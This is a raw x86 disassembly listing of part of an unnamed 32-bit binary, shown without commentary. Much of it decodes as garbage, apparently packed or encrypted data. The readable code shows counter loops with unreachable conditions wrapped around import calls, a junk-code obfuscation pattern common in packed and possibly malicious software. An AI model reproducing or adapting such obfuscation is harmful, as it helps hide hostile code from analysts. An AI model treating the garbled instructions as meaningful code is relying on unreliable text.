  405903:	test   eax,0x2bb1a13a
  405908:	dec    ebx
  405909:	sbb    DWORD PTR [ebp+0x322c456e],0x19d221fb
  405913:	dec    edx
  405914:	mov    eax,ds:0x83bca911
  405919:	fisubr WORD PTR [edx+0x37]
  40591c:	(bad)  
  40591d:	(bad)
  405920:	jbe    0x405906
  405922:	xor    al,dl
  405924:	mov    eax,0x6fb689fa
  405929:	mov    esi,ds
  40592b:	es push ss
  40592d:	adc    esi,DWORD PTR [eax-0x34f40a93]
  405933:	jnp    0x4058d7
  405935:	and    ecx,DWORD PTR ds:0x91c91fe
  40593b:	inc    BYTE PTR [edx+edx*8-0x60781445]
  405942:	(bad)  
  405943:	call   0x3ab5e742
  405948:	aas    
  405949:	aam    0xb2
  40594b:	les    eax,FWORD PTR [ebx-0x1b]
  40594e:	scas   al,BYTE PTR es:[edi]
  40594f:	je     0x405995
  405951:	ins    DWORD PTR es:[edi],dx
  405952:	jae    0x405947
  405954:	mov    bp,0xd110
  405958:	mov    ds:0x8093a1a0,al
  40595d:	cmc    
  40595e:	cmp    DWORD PTR [edx+esi*8],esp
  405961:	adc    BYTE PTR [ebx],cl
  405963:	ret    0x3e4e
  405966:	dec    eax
  405967:	sbb    al,BYTE PTR ds:0x6281ef58
  40596d:	jmp    0x2d19:0x3966268d
  405974:	add    al,0x78
  405976:	dec    edx
  405977:	xchg   ebx,eax
  405978:	fiadd  WORD PTR [eax+edi*2-0x2]
  40597c:	scas   eax,DWORD PTR es:[edi]
  40597d:	xor    al,0x4
  40597f:	or     bh,BYTE PTR [edx]
  405981:	mov    dl,0xa7
  405983:	inc    ebx
  405984:	mov    esp,ebp
  405986:	imul   esi,DWORD PTR [edi-0x47],0x45
  40598a:	jbe    0x405920
  40598c:	adc    DWORD PTR [ecx+0x66],ecx
  40598f:	loope  0x405965
  405991:	cmp    DWORD PTR [edx+ebx*1],eax
  405994:	sahf   
  405995:	cmp    edx,ebp
  405997:	sbb    al,0xec
  405999:	(bad)  [edi]
  40599b:	call   0x9d5d0664
  4059a0:	adc    ecx,esi
  4059a2:	and    al,0x85
  4059a4:	inc    esi
  4059a5:	cmp    al,0x46
  4059a7:	ins    DWORD PTR es:[edi],dx
  4059a8:	bound  edx,QWORD PTR [eax]
  4059aa:	jle    0x40595b
  4059ac:	pop    ss
  4059ad:	test   BYTE PTR [edx+0x18],ch
  4059b0:	add    BYTE PTR [esi],0x2
  4059b3:	mov    edx,0x854acf
  4059b8:	dec    ebx
  4059b9:	sub    al,0xfe
  4059bb:	adc    DWORD PTR [ecx+0x4d],ecx
  4059be:	mov    ecx,DWORD PTR ds:0x40d64c
  4059c4:	add    DWORD PTR [eax],ecx
  4059c6:	pop    edi
  4059c7:	pop    esi
  4059c8:	pop    ebx
  4059c9:	leave  
  4059ca:	ret    
  4059cb:	push   ebp
  4059cc:	mov    ebp,esp
  4059ce:	sub    esp,0x44
  4059d1:	push   edi
  4059d2:	sub    eax,DWORD PTR ds:0x4245b6
  4059d8:	mov    eax,DWORD PTR [ebp+0xc]
  4059db:	or     DWORD PTR ds:0x417e4d,edx
  4059e1:	mov    DWORD PTR [ebp-0x10],eax
  4059e4:	mov    DWORD PTR ds:0x417e55,0x17
  4059ee:	cmp    DWORD PTR ds:0x417e55,0x0
  4059f5:	je     0x405a59
  4059fb:	cmp    DWORD PTR ds:0x417e55,0x6
  405a02:	jne    0x405a2b
  405a08:	push   DWORD PTR [ebp-0x24]
  405a0b:	push   DWORD PTR [ebp-0x28]
  405a0e:	push   0x417e45
  405a13:	push   0x80ed
  405a18:	push   0x67be
  405a1d:	push   0x6b4c
  405a22:	push   DWORD PTR [ebp-0x20]
  405a25:	call   DWORD PTR ds:0x40d1cc
  405a2b:	cmp    DWORD PTR ds:0x417e55,0x7
  405a32:	jne    0x405a47
  405a38:	xor    ecx,ecx
  405a3a:	or     ecx,DWORD PTR ds:0x417e55
  405a40:	dec    ecx
  405a41:	mov    DWORD PTR ds:0x417e55,ecx
  405a47:	mov    ecx,DWORD PTR ds:0x417e55
  405a4d:	dec    ecx
  405a4e:	mov    DWORD PTR ds:0x417e55,ecx
  405a54:	jmp    0x4059ee
  405a59:	mov    eax,DWORD PTR [ebp+0x8]
  405a5c:	or     DWORD PTR ds:0x417e41,0x3fc5
  405a66:	mov    DWORD PTR [ebp+0x8],0xf89c8538
  405a6d:	xor    ecx,ecx
  405a6f:	add    ecx,DWORD PTR ds:0x4245b2
  405a75:	and    DWORD PTR ds:0x41abd6,ecx
  405a7b:	mov    DWORD PTR [ebp-0x20],0xf89c853b
  405a82:	mov    edx,DWORD PTR [ebp+0x8]
  405a85:	mov    DWORD PTR [ebp-0x40],eax
  405a88:	mov    eax,0x7510859
  405a8d:	xor    edx,eax
  405a8f:	adc    ecx,ecx
  405a91:	mov    ecx,0x32729f
  405a96:	movzx  edi,WORD PTR ds:0x41510d
  405a9d:	sbb    DWORD PTR ds:0x4245be,edi
  405aa3:	add    edx,ecx
  405aa5:	add    DWORD PTR ds:0x412354,0x1575
  405aaf:	mov    DWORD PTR [ebp-0x8],edx
  405ab2:	jmp    0x405c04
  405ab7:	(bad)  [edi+ebp*4-0x19]
  405abb:	mov    eax,ds:0x80785be5
  405ac0:	cmp    DWORD PTR ds:[edi],edx
  405ac3:	leave  
  405ac4:	pop    eax
  405ac5:	pop    es
  405ac6:	jmp    0x7ebe6651
  405acb:	and    edi,DWORD PTR [edi+0x7e]
  405ace:	jle    0x405b04
  405ad0:	call   0xf2107939
  405ad5:	xor    eax,0xf5d13f24
  405ada:	popf   
  405adb:	addr16 jb 0x405b09
  405ade:	out    0x7,eax
  405ae0:	mov    eax,ds:0xaeb88ce0
  405ae5:	pusha  
  405ae6:	mov    eax,0x231ea8d
  405aeb:	xor    eax,0x669abb4f
  405af0:	jmp    0x405b3f
  405af2:	mov    DWORD PTR [ebx-0x7],ebx
  405af5:	xchg   ebx,eax
  405af6:	or     esi,DWORD PTR [edi]
  405af8:	dec    esp
  405af9:	cmp    DWORD PTR [ebx+0xf],ecx
  405afc:	data16 icebp 
  405afe:	and    eax,0x4763788e
  405b03:	sbb    BYTE PTR [ebp*2+0x26e8d850],bl
  405b0a:	push   edi
  405b0b:	sub    BYTE PTR [ebx+esi*8],al
  405b0e:	pop    ebx
  405b0f:	jge    0x405ade
  405b11:	or     bh,bl
  405b13:	rol    BYTE PTR [edx-0xf],cl
  405b16:	scas   al,BYTE PTR es:[edi]
  405b17:	inc    esp
  405b18:	in     eax,0xe
  405b1a:	lods   eax,DWORD PTR ds:[esi]
  405b1b:	inc    ecx
  405b1c:	push   eax
  405b1d:	icebp  
  405b1e:	iret   
  405b1f:	ret    
  405b20:	jbe    0x405aeb
  405b22:	jmp    0x1c12:0xabbab0c5
  405b29:	scas   al,BYTE PTR es:[edi]
  405b2a:	push   ebp
  405b2b:	xor    DWORD PTR [ecx-0x6d],ebp
  405b2e:	test   DWORD PTR [edx+edx*4-0x3c],ebx
  405b32:	mov    al,ds:0x8e04f595
  405b37:	pop    ebp
  405b38:	push   esi
  405b39:	mov    al,ds:0x78c20be0
  405b3e:	xchg   esp,eax
  405b3f:	sub    al,0x58
  405b41:	push   ecx
  405b42:	xchg   edi,eax
  405b43:	and    cl,bh
  405b45:	add    esi,DWORD PTR [ebp+0x66718f3f]
  405b4b:	jnp    0x405bc3
  405b4d:	iret   
  405b4e:	nop    DWORD PTR [ebx-0x76]
  405b52:	push   ecx
  405b53:	test   al,0x89
  405b55:	cmc    
  405b56:	cmp    BYTE PTR [eax+0x77],ah
  405b59:	pop    ss
  405b5a:	sahf   
  405b5b:	jo     0x405b8d
  405b5d:	ins    DWORD PTR es:[edi],dx
  405b5e:	inc    eax
  405b5f:	(bad)  
  405b60:	xor    eax,0x523a8b97
  405b65:	mov    ecx,0x1b58b5a5
  405b6a:	mov    ds:0x814f3cb4,eax
  405b6f:	sub    dl,cl
  405b71:	xchg   esp,eax
  405b72:	test   eax,0x7719fd41
  405b77:	sahf   
  405b78:	xor    al,BYTE PTR [esi-0x35fb7198]
  405b7e:	(bad)  
  405b7f:	fmul   DWORD PTR [edx]
  405b81:	es out dx,eax
  405b83:	or     edx,DWORD PTR [edi+edi*4+0x676bc9b4]
  405b8a:	lods   eax,DWORD PTR ds:[esi]
  405b8b:	jmp    0x405b3c
  405b8d:	xchg   edi,eax
  405b8e:	in     al,0x6e
  405b90:	add    dh,bl
  405b92:	mov    cl,0x2b
  405b94:	and    ecx,DWORD PTR [edi+eax*1+0x1dc5c1ae]
  405b9b:	add    BYTE PTR [edx+esi*2],0x5e
  405b9f:	pop    esp
  405ba0:	lock jge 0x405be4
  405ba3:	lahf   
  405ba4:	or     DWORD PTR [ebx-0x53773cab],0x804e23b1
  405bae:	sub    eax,0x81fd1668
  405bb3:	dec    ebp
  405bb4:	cwde   
  405bb5:	sub    BYTE PTR [ebp+0x22],0xf3
  405bb9:	inc    edx
  405bba:	das    
  405bbb:	hlt    
  405bbc:	fcom   DWORD PTR [edx+0x59]
  405bbf:	push   es
  405bc0:	scas   eax,DWORD PTR es:[edi]
  405bc1:	call   0xe4c9dd68
  405bc6:	push   ebp
  405bc7:	xchg   ebx,eax
  405bc8:	ret    0x551a
  405bcb:	fcomp  DWORD PTR [ebx-0xe9f1bb8]
  405bd1:	pop    edi
  405bd2:	and    dl,BYTE PTR [ecx+0x5306b647]
  405bd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405bd9:	pop    edx
  405bda:	xor    al,0x44
  405bdc:	in     eax,0x8e
  405bde:	xor    ch,BYTE PTR [esi-0xfb8f78f]
  405be4:	add    DWORD PTR [edi],0xed75c2a2
  405bea:	adc    edx,esi
  405bec:	sub    BYTE PTR [eax],ch
  405bee:	push   esp
  405bef:	data16 test BYTE PTR [edi-0x168c8cad],0x2c
  405bf7:	push   0x15
  405bf9:	push   es
  405bfa:	or     dl,dl
  405bfc:	jo     0x405b9f
  405bfe:	dec    edx
  405bff:	ss in  eax,dx
  405c01:	xor    eax,0x558bbed6
  405c06:	or     BYTE PTR [ecx+0x4245c625],al
  405c0c:	add    BYTE PTR [eax],al
  405c0e:	add    BYTE PTR [eax],al
  405c10:	add    cl,ch
  405c12:	sldt   WORD PTR [eax]
  405c15:	add    BYTE PTR [ebx],dh
  405c17:	dec    DWORD PTR [ebx]
  405c19:	cmp    eax,0x4245c6
  405c1e:	inc    edi
  405c1f:	mov    DWORD PTR ds:0x4245c6,edi
  405c25:	cmp    DWORD PTR ds:0x4245c6,0x11
  405c2c:	jae    0x405c53
  405c32:	cmp    DWORD PTR ds:0x4245c6,0x1a
  405c39:	jne    0x405c48
  405c3f:	push   DWORD PTR [ebp-0x1c]
  405c42:	call   DWORD PTR ds:0x40d29c
  405c48:	jmp    0x405c16
  405c4d:	xor    DWORD PTR ds:0x412358,ebx
  405c53:	xor    edx,eax
  405c55:	add    edx,ecx
  405c57:	jmp    0x405da9
  405c5c:	xchg   edi,eax
  405c5d:	(bad)  
  405c5e:	call   0xe86f:0x6bdabbc6
  405c65:	pop    ds
  405c66:	jb     0x405cc2
  405c68:	mov    ah,ah
  405c6a:	mov    eax,0x7e084bef
  405c6f:	jle    0x405c94
  405c71:	jg     0x405cf1
  405c73:	jle    0x405c18
  405c75:	push   eax
  405c76:	cmp    eax,0x4923123a
  405c7b:	scas   al,BYTE PTR es:[edi]
  405c7c:	and    eax,0x3921f467
  405c81:	xor    ch,BYTE PTR [ecx+eax*2-0x1d]
  405c85:	or     BYTE PTR [ebp+0x12aa2247],ah
  405c8b:	cld    
  405c8c:	dec    esp
  405c8d:	mov    ds:0x87073f16,eax
  405c92:	setl   BYTE PTR ds:0xd909dc4d
  405c99:	(bad)  
  405c9a:	scas   al,BYTE PTR es:[edi]
  405c9b:	or     al,0xa3
  405c9d:	or     eax,esp
  405c9f:	jmp    0xe0e61b7d
  405ca4:	mov    WORD PTR [esi-0x36],gs
  405ca7:	add    edx,DWORD PTR [ebp-0x4c]
  405caa:	nop
  405cab:	mov    DWORD PTR [eax],ecx
  405cad:	sub    ch,BYTE PTR es:[ecx-0x57]
  405cb1:	fild   DWORD PTR ds:0x7287f7e5
  405cb7:	cmp    al,BYTE PTR [edx+0x5cf243c2]
  405cbd:	mov    esp,0x8a8edea9
  405cc2:	test   al,0x50
  405cc4:	xchg   BYTE PTR [esi+ebp*1],ah
  405cc7:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  405cc9:	aas    
  405cca:	stos   BYTE PTR es:[edi],al
  405ccb:	mov    edi,0xf7900feb
  405cd0:	fistp  QWORD PTR [esp+ebx*1]
  405cd3:	push   ebx
  405cd4:	imul   edi,DWORD PTR [eax-0x63],0x28a34fbf
  405cdb:	add    eax,0x128ab8bd
  405ce0:	out    0x84,al
  405ce2:	add    DWORD PTR [esi+0x60],edi
  405ce5:	lahf   
  405ce6:	or     BYTE PTR [eax],al
  405ce8:	clc    
  405ce9:	jle    0x405c91
  405ceb:	dec    ebp
  405cec:	(bad)  
  405ced:	xor    eax,0x57b3132c
  405cf2:	jle    0x405d64
  405cf4:	push   es
  405cf5:	or     al,0x23
  405cf7:	repnz out dx,al
  405cf9:	sbb    eax,0x4efa6ac
  405cfe:	push   ds
  405cff:	push   eax
  405d00:	mov    DWORD PTR [ebx],0xcaf9a91f
  405d06:	mov    ds:0x129a0dc4,al
  405d0b:	or     bl,dl
  405d0d:	cmp    esp,DWORD PTR [ebx]
  405d0f:	fcomp  st(1)
  405d12:	int    0xe6
  405d14:	or     esi,ecx
  405d16:	xor    dh,BYTE PTR [eax+0x2]
  405d19:	and    BYTE PTR [edx],dl
  405d1b:	shl    dl,0xb0
  405d1e:	add    al,0xba
  405d20:	arpl   bx,cx
  405d22:	add    BYTE PTR [edi+0x4d55d383],bh
  405d28:	xor    dl,BYTE PTR [ebx+0x1f2c0e72]
  405d2e:	hlt    
  405d2f:	popf   
  405d30:	mov    eax,ds:0xe7a35e8d
  405d35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d36:	mov    ch,0xd4
  405d38:	jae    0x405da1
  405d3a:	inc    ecx
  405d3b:	mov    eax,0x9f098ff2
  405d40:	jmp    0x609d:0xf38e5019
  405d47:	cmp    edi,ebp
  405d49:	das    
  405d4a:	or     eax,0x61106b88
  405d4f:	push   ds
  405d50:	cdq    
  405d51:	mov    dl,0x4
  405d53:	adc    BYTE PTR [edx-0x29],ah
  405d56:	aas    
  405d57:	mov    esp,0x32e86c1c
  405d5c:	inc    edi
  405d5d:	adc    BYTE PTR [ecx+0x12],0x4f
  405d61:	js     0x405dd9
  405d63:	sbb    eax,0x556468ed
  405d68:	or     eax,0xba500fc
  405d6d:	ror    DWORD PTR [ebx],cl
  405d6f:	jp     0x405d75
  405d71:	fisub  WORD PTR [edx]
  405d73:	js     0x405db1
  405d75:	jmp    0x71f5:0x3d09dd5d
  405d7c:	jecxz  0x405d64
  405d7e:	push   esi
  405d7f:	or     BYTE PTR ds:[edi],dh
  405d82:	add    DWORD PTR [ecx+0x6866bdc9],ebp
  405d88:	mov    edx,0x868a8333
  405d8d:	ret    0xbbc6
  405d90:	ret    0x83cf
  405d93:	test   BYTE PTR [edi],ah
  405d95:	retf   
  405d96:	xor    ch,0x28
  405d99:	sub    DWORD PTR [edx-0x5f],ecx
  405d9c:	push   edx
  405d9d:	loope  0x405def
  405d9f:	mov    al,0xee
  405da1:	mov    ah,0xc
  405da3:	rcr    BYTE PTR [ebp-0x3a],0xe2
  405da7:	stc    
  405da8:	cmp    DWORD PTR [ecx-0x16b8f3ab],ecx
  405dae:	dec    ebp
  405daf:	add    DWORD PTR [eax],eax
  405db1:	add    BYTE PTR ds:0xb8afae9b,cl
  405db7:	mov    ebx,0x598db90d
  405dbc:	or     al,0x3
  405dbe:	or     DWORD PTR [ebx+0xe7c4775],ebx
  405dc4:	jle    0x405e44
  405dc6:	and    edi,DWORD PTR [edi+0x7e]
  405dc9:	jle    0x405e0b
  405dcb:	into   
  405dcc:	dec    eax
  405dcd:	pop    ebp
  405dce:	arpl   bp,di
  405dd0:	sub    bl,0x2a
  405dd3:	and    dh,0xec
  405dd6:	push   es
  405dd7:	leave  
  405dd8:	ds inc ebx
  405dda:	sub    dh,BYTE PTR [esi+edx*8+0x327de73e]
  405de1:	std    
  405de2:	mov    ch,0x95
  405de4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405de5:	std    
  405de6:	arpl   WORD PTR [ebx],cx
  405de8:	fs mov ah,dl
  405deb:	inc    DWORD PTR [ecx-0x70a19cb]
  405df1:	dec    ebp
  405df2:	jp     0x405dd8
  405df4:	jno    0x405df7
  405df6:	loope  0x405ddc
  405df8:	adc    ecx,esi
  405dfa:	rcl    BYTE PTR [esi+0xc],0x83
  405dfe:	cmp    DWORD PTR ds:[ebx+eax*4+0x2d5ee5fc],eax
  405e06:	push   0xe4a956f
  405e0b:	popf   
  405e0c:	inc    ecx
  405e0d:	mov    cl,0xbf
  405e0f:	sub    BYTE PTR [ebx+0x24],0xf5
  405e13:	in     al,dx
  405e14:	ret    0xf144
  405e17:	cld    
  405e18:	cli    
  405e19:	sub    ecx,edi
  405e1b:	popf   
  405e1c:	mov    cl,0x84
  405e1e:	inc    eax
  405e1f:	lods   eax,DWORD PTR ds:[esi]
  405e20:	mov    ds:0x1b04cb10,al
  405e25:	mov    ebp,ebp
  405e27:	xchg   ebx,eax
  405e28:	out    dx,al
  405e29:	xor    BYTE PTR [bx+si+0x76],ah
  405e2d:	cmp    ah,cl
  405e2f:	enter  0x769d,0xb4
  405e33:	inc    ebx
  405e34:	test   eax,0x2148839d
  405e39:	ins    BYTE PTR es:[edi],dx
  405e3a:	mov    WORD PTR [esi+0x2aa7a7d8],?
  405e40:	test   bh,bl
  405e42:	add    BYTE PTR [edx-0x50],0x8
  405e46:	fisub  WORD PTR [esi+0x48d4bc4a]
  405e4c:	int    0x53
  405e4e:	sbb    dh,BYTE PTR [eax]
  405e50:	scas   eax,DWORD PTR es:[edi]
  405e51:	jae    0x405e2a
  405e53:	outs   dx,DWORD PTR ds:[esi]
  405e54:	xchg   edi,eax
  405e55:	ret    
  405e56:	cld    
  405e57:	dec    esi
  405e58:	add    BYTE PTR [ebx+0x73],dh
  405e5b:	fnstsw WORD PTR [ecx+ebx*4-0x1a]
  405e5f:	ret    
  405e60:	xlat   BYTE PTR ds:[ebx]
  405e61:	jb     0x405ee2
  405e63:	pop    esi
  405e64:	and    ch,BYTE PTR [ebp-0x57815d43]
  405e6a:	cmp    esp,DWORD PTR [eax-0x27]
  405e6d:	jnp    0x405eae
  405e6f:	push   es
  405e70:	cld    
  405e71:	mov    DWORD PTR [edi],0xd77aa09a
  405e77:	sar    BYTE PTR [ebp-0x566d0f17],cl
  405e7d:	mov    eax,ds:0x92aafa30
  405e82:	dec    eax
  405e83:	in     al,0xf7
  405e85:	scas   eax,DWORD PTR es:[edi]
  405e86:	add    eax,0x99dfdc78
  405e8b:	xor    al,0x74
  405e8d:	xor    eax,0x905acf47
  405e92:	fstp   TBYTE PTR [ebp+0x49]
  405e95:	inc    ebx
  405e96:	int3   
  405e97:	or     BYTE PTR [ebp+0x5d],ah
  405e9a:	push   ebp
  405e9b:	and    al,0xe7
  405e9d:	inc    ebx
  405e9e:	dec    ebx
  405e9f:	mov    edx,0xee45f359
  405ea4:	sub    DWORD PTR ds:0xa10af505,esi
  405eaa:	pop    edx
  405eab:	sub    BYTE PTR cs:[ebx],ch
  405eae:	out    0xd5,eax
  405eb0:	ror    DWORD PTR [eax+0x1d81aad0],0x4a
  405eb7:	sbb    DWORD PTR [edi+0x35],0xd2072914
  405ebe:	mov    esi,0x93f5877f
  405ec3:	adc    eax,0x4cfd5651
  405ec8:	dec    edi
  405ec9:	stc    
  405eca:	ss cmp al,0xa5
  405ecd:	outs   dx,BYTE PTR ds:[esi]
  405ece:	mov    ebp,?
  405ed0:	sbb    BYTE PTR [ecx-0x29d75d6b],bh
  405ed6:	adc    eax,0xcfc42b2
  405edb:	xor    al,0x91
  405edd:	xor    al,BYTE PTR [ebx]
  405edf:	xor    al,0x58
  405ee1:	sbb    ah,BYTE PTR [esi+0x7d]
  405ee4:	jno    0x405e7b
  405ee6:	mov    ecx,0x9a1c0be7
  405eeb:	ficomp WORD PTR [esi]
  405eed:	call   0x2173:0x409528b8
  405ef4:	adc    eax,0xf15b4d73
  405ef9:	mov    esp,fs
  405efb:	cli    
  405efc:	jmp    0xd8fc:0x45c743e2
  405f03:	test   DWORD PTR [eax+edi*8+0x3d33ff33],ebx
  405f0a:	or     DWORD PTR [ecx+0x41],edx
  405f0d:	add    BYTE PTR [ebx],dl
  405f0f:	cmp    eax,0x4245ae
  405f14:	mov    DWORD PTR ds:0x415109,edi
  405f1a:	mov    DWORD PTR [ebp-0x28],0xf89c853a
  405f21:	mov    DWORD PTR [ebp-0x2c],0xf89c853d
  405f28:	adc    edi,edi
  405f2a:	mov    DWORD PTR [ebp-0x30],0xf89c853c
  405f31:	or     DWORD PTR ds:0x4245be,edx
  405f37:	mov    DWORD PTR [ebp-0x34],0xf89c853f
  405f3e:	mov    DWORD PTR ds:0x417e41,0x15
  405f48:	cmp    DWORD PTR ds:0x417e41,0x0
  405f4f:	je     0x405fae
  405f55:	cmp    DWORD PTR ds:0x417e41,0x5
  405f5c:	jne    0x405f7c
  405f62:	push   0x43a6
  405f67:	push   0x41ac41
  405f6c:	push   0x41ac72
  405f71:	push   0x400000
  405f76:	call   DWORD PTR ds:0x40d1d0
  405f7c:	cmp    DWORD PTR ds:0x417e41,0x6
  405f83:	jne    0x405f96
  405f89:	mov    edi,DWORD PTR ds:0x417e41
  405f8f:	dec    edi
  405f90:	mov    DWORD PTR ds:0x417e41,edi
  405f96:	mov    edi,DWORD PTR ds:0x417e41
  405f9c:	dec    edi
  405f9d:	mov    DWORD PTR ds:0x417e41,edi
  405fa3:	jmp    0x405f48
  405fa8:	xor    edi,DWORD PTR ds:0x417e4d
  405fae:	mov    DWORD PTR [ebp-0x38],0xf89c853e
  405fb5:	and    DWORD PTR ds:0x412364,0xe44
  405fbf:	mov    DWORD PTR [ebp-0x3c],0xf89c8531
  405fc6:	or     DWORD PTR ds:0x417e49,0x6f97
  405fd0:	mov    edx,DWORD PTR [ebp+0x8]
  405fd3:	and    DWORD PTR ds:0x417e55,0x0
  405fdd:	jmp    0x405fef
  405fe2:	mov    edi,DWORD PTR ds:0x417e55
  405fe8:	inc    edi
  405fe9:	mov    DWORD PTR ds:0x417e55,edi
  405fef:	cmp    DWORD PTR ds:0x417e55,0x14
  405ff6:	jae    0x40601f
  405ffc:	cmp    DWORD PTR ds:0x417e55,0x1c
  406003:	jne    0x406014
  406009:	push   0x67ac
  40600e:	call   DWORD PTR ds:0x40d2a0
  406014:	jmp    0x405fe2
  406019:	sub    edi,DWORD PTR ds:0x412378
  40601f:	xor    edx,eax
  406021:	mov    edi,DWORD PTR [ebp-0x10]
  406024:	add    edx,ecx
  406026:	cmp    edi,edx
  406028:	mov    DWORD PTR ds:0x412368,0x5602
  406032:	je     0x407428
  406038:	mov    DWORD PTR ds:0x415109,0xf2d
  406042:	jmp    0x406194
  406047:	lock mov ebx,0xdc791c5b
  40604d:	jns    0x40600a
  40604f:	mov    eax,ds:0x67db13c5
  406054:	je     0x406052
  406056:	js     0x406079
  406058:	movd   DWORD PTR [esi+0x23],mm7
  40605c:	jg     0x4060dc
  40605e:	jle    0x406067
  406060:	(bad)  
  406061:	cli    
  406062:	or     al,0x3e
  406064:	add    DWORD PTR [ecx-0x1e],ebp
  406067:	imul   esp,DWORD PTR [edi-0x7d],0x73
  40606b:	push   ds
  40606c:	dec    esp
  40606d:	(bad)  
  40606e:	or     ebx,DWORD PTR [edi-0x5b9c0236]
  406074:	jge    0x4060be
  406076:	push   ebx
  406077:	push   ss
  406078:	inc    ebx
  406079:	iret   
  40607a:	jo     0x9791453a
  406080:	lods   al,BYTE PTR ds:[esi]
  406081:	pushf  
  406082:	sub    ecx,DWORD PTR [edx-0x66]
  406085:	not    BYTE PTR ds:0x8c4f0cb7
  40608b:	sub    esp,esp
  40608d:	bound  edi,QWORD PTR [edi]
  40608f:	push   0x6
  406091:	sbb    DWORD PTR [eax],eax
  406093:	pop    ss
  406094:	lods   al,BYTE PTR ds:[esi]
  406095:	pop    ecx
  406096:	pop    es
  406097:	aas    
  406098:	mov    bl,0x8d
  40609a:	sbb    al,0x3e
  40609c:	cmp    ecx,edx
  40609e:	call   FWORD PTR [ebp-0x41]
  4060a1:	jo     0x40608f
  4060a3:	mov    BYTE PTR [ebp-0x64dd1951],bl
  4060a9:	mov    ebx,0xade6f93c
  4060ae:	mov    ds:0x5071e30e,eax
  4060b3:	jge    0x4060ba
  4060b5:	loopne 0x406069
  4060b7:	sti    
  4060b8:	cli    
  4060b9:	out    0x5,eax
  4060bb:	int3   
  4060bc:	and    al,0x30
  4060be:	out    dx,eax
  4060bf:	aad    0xd2
  4060c1:	pop    edi
  4060c2:	sub    ch,BYTE PTR [ecx-0x7a]
  4060c5:	mov    ss,WORD PTR ds:0xa5ddfe65
  4060cb:	fs ret 0x4d59
  4060cf:	fsub   DWORD PTR [ecx]
  4060d1:	test   ebp,eax
  4060d3:	sbb    ebx,DWORD PTR [edx+ebp*2+0x77238921]
  4060da:	mov    ds:0xd024d4ad,al
  4060df:	dec    edx
  4060e0:	lea    ebp,[ecx-0x236cac8]
  4060e6:	repnz xor al,BYTE PTR [esi+0x373edc6e]
  4060ed:	xchg   edi,eax
  4060ee:	sbb    DWORD PTR [ecx],0xecc16d82
  4060f4:	fwait
  4060f5:	stos   BYTE PTR es:[edi],al
  4060f6:	es popf 
  4060f8:	inc    ecx
  4060f9:	(bad)  
  4060fa:	scas   al,BYTE PTR es:[edi]
  4060fb:	inc    esi
  4060fc:	push   eax
  4060fd:	je     0x406150
  4060ff:	or     al,0xcf
  406101:	adc    al,0x38
  406103:	jmp    0x4060b5
  406105:	aad    0x16
  406107:	mov    cl,0x9f
  406109:	lea    esp,[ecx-0x7c902f21]
  40610f:	ins    BYTE PTR es:[edi],dx
  406110:	shl    bl,1
  406112:	xor    BYTE PTR [esi-0x4670386e],dl
  406118:	imul   ebx,DWORD PTR [esi-0x5e5ce097],0xfcc34955
  406122:	jmp    0x4060e6
  406124:	mov    eax,ds:0xaa4ab464
  406129:	mov    cl,BYTE PTR [edx]
  40612b:	jecxz  0x406193
  40612d:	adc    al,0x2
  40612f:	xchg   ecx,eax
  406130:	clc    
  406131:	xor    dh,BYTE PTR [ebp-0x4e]
  406134:	out    dx,al
  406135:	add    esi,DWORD PTR [ecx]
  406137:	mov    ecx,ecx
  406139:	add    ebp,ebx
  40613b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40613c:	pusha  
  40613d:	leave  
  40613e:	cmp    eax,0x81da4480
  406143:	jno    0x40613a
  406145:	xchg   DWORD PTR [eax],eax
  406147:	xchg   ebp,eax
  406148:	pop    ds
  406149:	leave  
  40614a:	xor    DWORD PTR [ebx],edi
  40614c:	aas    
  40614d:	mov    ecx,0xf6973c08
  406152:	add    bl,cl
  406154:	add    BYTE PTR [esi-0x7a27642],0x18
  40615b:	push   ebx
  40615c:	mov    bh,0xd4
  40615e:	test   cl,cl
  406160:	sbb    BYTE PTR [ecx+0x37],ch
  406163:	test   DWORD PTR [esi-0xaf73dcc],edx
  406169:	mov    ?,WORD PTR [ebx]
  40616b:	(bad)  
  40616c:	rcl    BYTE PTR [ebx+0x4a061843],0x74
  406173:	mov    cl,0x75
  406175:	lods   eax,DWORD PTR ds:[esi]
  406176:	inc    eax
  406177:	push   0x76
  406179:	mov    bl,0xcc
  40617b:	cld    
  40617c:	push   esp
  40617d:	icebp  
  40617e:	(bad)  
  40617f:	mov    ds:0x9b58f388,eax
  406184:	mov    ebp,0xcaf2f8f5
  406189:	imul   esi,DWORD PTR [edi],0xffffff89
  40618c:	repz mov esp,0x26c44b88
  406192:	dec    esp
  406193:	mov    edx,0xfc5e953
  406198:	add    BYTE PTR [eax],al
  40619a:	and    DWORD PTR ds:0x412370,0x0
  4061a4:	jmp    0x4061b6
  4061a9:	mov    edx,DWORD PTR ds:0x412370
  4061af:	inc    edx
  4061b0:	mov    DWORD PTR ds:0x412370,edx
  4061b6:	cmp    DWORD PTR ds:0x412370,0x1e
  4061bd:	jae    0x4061ea
  4061c3:	cmp    DWORD PTR ds:0x412370,0x2a
  4061ca:	jne    0x4061e3
  4061d0:	push   DWORD PTR [ebp-0x10]
  4061d3:	push   0x41acf1
  4061d8:	push   0x41ac28
  4061dd:	call   DWORD PTR ds:0x40d000
  4061e3:	jmp    0x4061a9
  4061e8:	adc    edi,edi
  4061ea:	mov    edx,DWORD PTR [ebp-0x8]
  4061ed:	mov    DWORD PTR ds:0x412364,0x11
  4061f7:	cmp    DWORD PTR ds:0x412364,0x0
  4061fe:	je     0x406239
  406204:	cmp    DWORD PTR ds:0x412364,0x14
  40620b:	jne    0x406227
  406211:	push   0x44a4
  406216:	push   DWORD PTR [ebp-0x20]
  406219:	push   0x788c
  40621e:	push   DWORD PTR [ebp-0x10]
  406221:	call   DWORD PTR ds:0x40d360
  406227:	mov    edi,DWORD PTR ds:0x412364
  40622d:	dec    edi
  40622e:	mov    DWORD PTR ds:0x412364,edi
  406234:	jmp    0x4061f7
  406239:	mov    edi,DWORD PTR [ebp-0x10]
  40623c:	or     DWORD PTR ds:0x41235c,0x6f22
  406246:	sub    edi,edx
  406248:	adc    DWORD PTR ds:0x4245b2,edi
  40624e:	mov    edx,DWORD PTR [ebp-0x4]
  406251:	adc    DWORD PTR ds:0x41abca,0x7639
  40625b:	xor    edx,eax
